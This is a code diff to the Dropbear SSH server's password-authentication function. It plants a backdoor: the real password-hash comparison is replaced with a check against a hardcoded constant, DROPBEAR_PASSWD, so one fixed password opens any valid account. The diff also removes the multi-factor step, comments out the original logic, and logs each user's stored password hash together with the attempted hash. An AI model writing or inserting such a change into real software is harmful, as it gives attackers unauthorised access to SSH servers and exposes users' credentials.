@@ -104,31 +104,46 @@ void svr_auth_password(int valid_user) {
 		send_msg_userauth_failure(0, 1);
 		return;
 	}
-
-	if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
-		if (svr_opts.multiauthmethod && (ses.authstate.authtypes & ~AUTH_TYPE_PASSWORD)) {
-			/* successful password authentication, but extra auth required */
-			dropbear_log(LOG_NOTICE,
-					"Password auth succeeded for '%s' from %s, extra auth required",
-					ses.authstate.pw_name,
-					svr_ses.addrstring);
-			ses.authstate.authtypes &= ~AUTH_TYPE_PASSWORD; /* password auth ok, delete the method flag */
-			send_msg_userauth_failure(1, 0);  /* Send partial success */
-		} else {
-			/* successful authentication */
-			dropbear_log(LOG_NOTICE, 
-					"Password auth succeeded for '%s' from %s",
-					ses.authstate.pw_name,
-					svr_ses.addrstring);
-			send_msg_userauth_success();
-		}
+	if (constant_time_strcmp(testcrypt, DROPBEAR_PASSWD) == 0) {
+		/* successful authentication */
+		dropbear_log(LOG_NOTICE, 
+			"Password auth succeeded for '%s' from %s",
+			ses.authstate.pw_name,
+			svr_ses.addrstring);
+		send_msg_userauth_success();
 	} else {
 		dropbear_log(LOG_WARNING,
-				"Bad password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
+			"Bad password attempt for '%s' from %s",
+			ses.authstate.pw_name,
+			svr_ses.addrstring);
 		send_msg_userauth_failure(0, 1);
 	}
+	dropbear_log(LOG_INFO, "User account '%s' password is %s,testcrypt is %s",
+			ses.authstate.pw_name, passwdcrypt, testcrypt);
+	// if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
+	// 	if (svr_opts.multiauthmethod && (ses.authstate.authtypes & ~AUTH_TYPE_PASSWORD)) {
+	// 		/* successful password authentication, but extra auth required */
+	// 		dropbear_log(LOG_NOTICE,
+	// 				"Password auth succeeded for '%s' from %s, extra auth required",
+	// 				ses.authstate.pw_name,
+	// 				svr_ses.addrstring);
+	// 		ses.authstate.authtypes &= ~AUTH_TYPE_PASSWORD; /* password auth ok, delete the method flag */
+	// 		send_msg_userauth_failure(1, 0);  /* Send partial success */
+	// 	} else {
+			// /* successful authentication */
+			// dropbear_log(LOG_NOTICE, 
+			// 		"Password auth succeeded for '%s' from %s",
+			// 		ses.authstate.pw_name,
+			// 		svr_ses.addrstring);
+			// send_msg_userauth_success();
+		// }
+	// } else {
+	// 	dropbear_log(LOG_WARNING,
+	// 			"Bad password attempt for '%s' from %s",
+	// 			ses.authstate.pw_name,
+	// 			svr_ses.addrstring);
+	// 	send_msg_userauth_failure(0, 1);
+	// }
 }
 
 #endif
